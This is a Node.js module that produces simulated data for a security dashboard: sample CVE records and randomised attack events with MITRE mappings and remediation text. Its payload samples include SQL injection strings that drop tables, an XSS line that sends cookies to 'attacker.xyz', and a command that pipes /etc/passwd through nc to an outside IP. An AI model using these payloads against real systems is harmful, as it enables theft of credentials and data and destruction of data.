// Static sample threat-intel dataset styled after real CVE/MITRE fields.
// In a production version, this module would be replaced by scheduled
// fetch jobs against the NVD CVE API, MITRE ATT&CK STIX feed, and
// AbuseIPDB — each behind its own API key and cache layer.

const cves = [
  {
    id: 'CVE-2024-3094',
    severity: 'CRITICAL',
    cvss: 10.0,
    summary: 'Backdoor introduced into xz/liblzma via malicious upstream commits, enabling SSH authentication bypass.',
    affected: 'xz-utils 5.6.0 - 5.6.1',
    mitreTactic: 'Initial Access (T1195 - Supply Chain Compromise)',
  },
  {
    id: 'CVE-2023-44487',
    severity: 'HIGH',
    cvss: 7.5,
    summary: 'HTTP/2 Rapid Reset allows attackers to exhaust server resources via rapid stream cancellation.',
    affected: 'HTTP/2-enabled web servers',
    mitreTactic: 'Impact (T1499 - Endpoint Denial of Service)',
  },
  {
    id: 'CVE-2021-44228',
    severity: 'CRITICAL',
    cvss: 10.0,
    summary: 'Log4Shell: JNDI lookup in Log4j allows remote code execution via crafted log messages.',
    affected: 'Apache Log4j 2.0-beta9 to 2.15.0',
    mitreTactic: 'Execution (T1059 - Command and Scripting Interpreter)',
  },
  {
    id: 'CVE-2022-22965',
    severity: 'CRITICAL',
    cvss: 9.8,
    summary: 'Spring4Shell: remote code execution via data binding in Spring MVC/WebFlux on JDK 9+.',
    affected: 'Spring Framework 5.3.0 - 5.3.17',
    mitreTactic: 'Execution (T1190 - Exploit Public-Facing Application)',
  },
  {
    id: 'CVE-2020-1472',
    severity: 'CRITICAL',
    cvss: 10.0,
    summary: 'Zerologon: elevation of privilege via Netlogon Remote Protocol cryptographic flaw.',
    affected: 'Windows Server (all supported versions, pre-patch)',
    mitreTactic: 'Privilege Escalation (T1068)',
  },
];

// Rolling simulated "live" attack feed. Each request perturbs this a bit
// so the dashboard feels alive without needing a real packet capture pipeline.
const attackTypes = [
  // Network & Access Attacks
  'Brute Force (SSH)',
  'Brute Force (RDP)',
  'Brute Force (FTP)',
  'Port Scan',
  'Network Reconnaissance',
  'SYN Flood (DDoS)',
  'UDP Flood (DDoS)',
  'Slowloris Attack',
  
  // Web Application Attacks
  'SQL Injection Attempt',
  'Cross-Site Scripting (XSS)',
  'Cross-Site Request Forgery (CSRF)',
  'XML External Entity (XXE)',
  'Path Traversal',
  'Command Injection',
  'LDAP Injection',
  
  // Credential & Authentication
  'Credential Stuffing',
  'Password Spraying',
  'Weak Cipher Detection',
  'SSL/TLS Downgrade',
  'Session Hijacking',
  
  // Malware & Backdoors
  'Malware C2 Beacon',
  'Botnet Activity',
  'Ransomware Dropper',
  'Keylogger Detected',
  'Remote Access Trojan (RAT)',
  'Worm Propagation',
  'Privilege Escalation Exploit',
  
  // Social & Targeting
  'Phishing Link Click',
  'Spear Phishing Domain',
  'Watering Hole Attack',
  'Business Email Compromise',
  
  // Zero-Day & Advanced
  'Zero-Day Exploit Attempt',
  'Polymorphic Malware',
  'Advanced Persistent Threat (APT)',
  'Lateral Movement Detected',
  
  // Data Exfiltration
  'Data Exfiltration',
  'DNS Tunneling',
  'Covert Channel Communication',
  'Large File Transfer Anomaly',
];

const countries = [
  'RU', 'CN', 'US', 'BR', 'IN', 'NG', 'DE', 'VN', 'KR', 'IR',
  'PK', 'ID', 'BD', 'TH', 'TR', 'UA', 'PH', 'MX', 'BO', 'CU',
];

const targetPorts = [22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 3306, 3389, 5432, 5900, 8080, 8443, 9200];

const targetServices = ['SSH', 'Telnet', 'SMTP', 'DNS', 'HTTP', 'POP3', 'IMAP', 'HTTPS', 'SMB', 'MySQL', 'RDP', 'PostgreSQL', 'VNC', 'Elasticsearch'];

function randomIp() {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 255) + 1).join('.');
}

const attackMetadataMap = {
  'SQL Injection Attempt': {
    mitre: 'T1190 - Exploit Public-Facing Application',
    payloads: ["' OR 1=1; DROP TABLE users; --", "UNION SELECT null, username, password FROM accounts--", "1' AND SLEEP(5)#"],
    remediation: 'Apply prepared statements / parameterized queries and verify WAF SQLi inspection rules.'
  },
  'Cross-Site Scripting (XSS)': {
    mitre: 'T1059.007 - JavaScript Execution',
    payloads: ['<script>fetch("https://attacker.xyz/steal?c="+document.cookie)</script>', '<img src=x onerror=alert(document.domain)>'],
    remediation: 'Implement strict Content Security Policy (CSP) and HTML output encoding.'
  },
  'Command Injection': {
    mitre: 'T1059 - Command and Scripting Interpreter',
    payloads: ['; cat /etc/passwd | nc 185.220.101.4 4444', '| powershell -enc JABjAGwAaQBlAG4AdAA...'],
    remediation: 'Sanitize OS command inputs, restrict process execution privileges, and sandbox shell calls.'
  },
  'Brute Force (SSH)': {
    mitre: 'T1110.001 - Password Guessing',
    payloads: ['SSH-2.0-libssh_0.8.1 (user=root pass=123456)', 'auth_attempt: user=admin count=42/sec'],
    remediation: 'Enforce SSH key-only authentication, disable root login, and activate fail2ban rate limiting.'
  },
  'Brute Force (RDP)': {
    mitre: 'T1110.003 - Password Spraying',
    payloads: ['RDP-NEGOTIATE: user=Administrator pass=Password1!'],
    remediation: 'Restrict RDP port 3389 via VPN, enforce NLA (Network Level Authentication) and MFA.'
  },
  'SYN Flood (DDoS)': {
    mitre: 'T1498.001 - Direct Network Flood',
    payloads: ['TCP SYN flags=0x02 seq=0xdeadbeef window=1024 count=120k/s'],
    remediation: 'Enable SYN cookies on OS kernel and activate cloud anti-DDoS scrubbing.'
  },
  'Ransomware Dropper': {
    mitre: 'T1204.002 - Malicious File Execution',
    payloads: ['POST /upload/receipt.pdf.exe -> Encrypted file header detected (0x57414E4E41)'],
    remediation: 'Immediately isolate affected host from network, block C2 IP, and inspect file hashes.'
  },
  'Malware C2 Beacon': {
    mitre: 'T1071.001 - Web Protocols Command and Control',
    payloads: ['GET /api/v1/heartbeat HTTP/1.1 (Host: c2-domain.onion.pet, base64 data stream)'],
    remediation: 'Block destination IP/domain on firewall/DNS, terminate associated process ID, and collect memory dump.'
  },
  'Data Exfiltration': {
    mitre: 'T1048 - Exfiltration Over Alternative Protocol',
    payloads: ['DNS query: 61626364.exfil.attacker-ns.org (Tunneling 48MB chunks)'],
    remediation: 'Inspect DNS traffic logs, sinkhole rogue nameserver, and enforce egress filtering.'
  },
  'Zero-Day Exploit Attempt': {
    mitre: 'T1212 - Exploitation for Credential Access',
    payloads: ['Heap memory corruption sequence -> 0x7ffd98a000 (ROP chain gadget injected)'],
    remediation: 'Deploy runtime memory protection (ASLR/DEP), activate EDR host isolation, and review vendor advisories.'
  }
};

const countryCityMap = {
  'RU': ['Moscow', 'Saint Petersburg', 'Novosibirsk'],
  'CN': ['Shenzhen', 'Beijing', 'Shanghai'],
  'US': ['Dallas', 'Ashburn', 'San Jose'],
  'DE': ['Frankfurt', 'Berlin', 'Munich'],
  'BR': ['São Paulo', 'Rio de Janeiro'],
  'IN': ['Bangalore', 'Mumbai', 'Delhi'],
  'VN': ['Hanoi', 'Ho Chi Minh City'],
  'NL': ['Amsterdam', 'Rotterdam'],
  'KR': ['Seoul', 'Busan'],
  'UA': ['Kyiv', 'Lviv']
};

function getAttackSeverity(attackType) {
  const criticalKeywords = ['ransomware', 'apt', 'zero-day', 'privilege escalation', 'c2 beacon', 'rat', 'lateral movement', 'exfiltration'];
  const highKeywords = ['sql injection', 'rce', 'exploit', 'brute force', 'ddos', 'botnet', 'malware', 'keylogger', 'worm'];
  
  const lower = attackType.toLowerCase();
  if (criticalKeywords.some(kw => lower.includes(kw))) return 'CRITICAL';
  if (highKeywords.some(kw => lower.includes(kw))) return 'HIGH';
  if (Math.random() > 0.6) return 'MEDIUM';
  return 'LOW';
}

function generateLiveAttacks(count = 12) {
  return Array.from({ length: count }, (_, i) => {
    const attackType = attackTypes[Math.floor(Math.random() * attackTypes.length)];
    const severity = getAttackSeverity(attackType);
    
    // More sophisticated blocking based on severity
    const blockChance = severity === 'CRITICAL' ? 0.75 : severity === 'HIGH' ? 0.65 : severity === 'MEDIUM' ? 0.45 : 0.25;
    const blocked = Math.random() < blockChance;
    
    const targetPort = targetPorts[Math.floor(Math.random() * targetPorts.length)];
    const targetService = targetServices[Math.floor(Math.random() * targetServices.length)];
    const country = countries[Math.floor(Math.random() * countries.length)];
    const cityList = countryCityMap[country] || ['Unknown City'];
    const city = cityList[Math.floor(Math.random() * cityList.length)];
    
    const meta = attackMetadataMap[attackType] || {
      mitre: 'T1078 - Valid Accounts & Protocol Abuse',
      payloads: [`[SIMULATED] Malicious frame targeting :${targetPort}/${targetService}`],
      remediation: 'Inspect firewall logs, enforce multi-factor authentication, and monitor host anomalies.'
    };

    const payloadSnippet = meta.payloads[Math.floor(Math.random() * meta.payloads.length)];

    return {
      id: `${Date.now()}-${i}`,
      timestamp: new Date(Date.now() - i * 1000 * 45).toISOString(),
      sourceIp: randomIp(),
      sourcePort: Math.floor(Math.random() * 65535) + 1024,
      destPort: targetPort,
      country,
      city,
      type: attackType,
      severity,
      blocked,
      targetService,
      protocol: ['TCP', 'UDP', 'ICMP'][Math.floor(Math.random() * 3)],
      bytesTransferred: Math.floor(Math.random() * 1000000) + 1024,
      packets: Math.floor(Math.random() * 10000) + 10,
      mitreTechnique: meta.mitre,
      payloadSnippet,
      remediation: meta.remediation,
      threatIntelMatch: Math.random() > 0.7 ? `Matches known signature #${Math.floor(Math.random() * 5000)}` : null,
    };
  });
}

module.exports = { cves, generateLiveAttacks };
